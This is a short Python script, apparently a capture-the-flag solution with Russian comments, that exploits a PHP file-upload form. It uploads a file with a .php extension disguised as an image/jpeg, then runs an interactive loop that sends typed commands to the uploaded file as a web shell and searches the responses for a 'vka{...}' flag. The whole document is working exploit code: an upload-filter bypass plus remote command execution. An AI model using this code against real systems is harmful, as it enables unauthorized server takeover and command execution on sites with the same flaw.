import requests,sys,re

s = requests.Session()
url = sys.argv[1]
# отправляем файл на сервер
with open('your_image_with_payload', 'rb') as f:
    img = f.read()
res = s.post(f'{url}/upload.php', files={
     "fileToUpload": (f"your_image_with_payload.php", img, "image/jpeg")})
# веб шел
while True:
    cmd = input('введи команду:')     
    res = s.get(f'{url}/uploads/your_image_with_payload.php?cmd={cmd}')
    if (re.search("vka\{.*\}",res.text)):
        flag = re.findall("vka{.*}",res.text)
        print(flag)
        break
    else:
        print(re.findall("[a-z0-9._]{4,}",res.text))
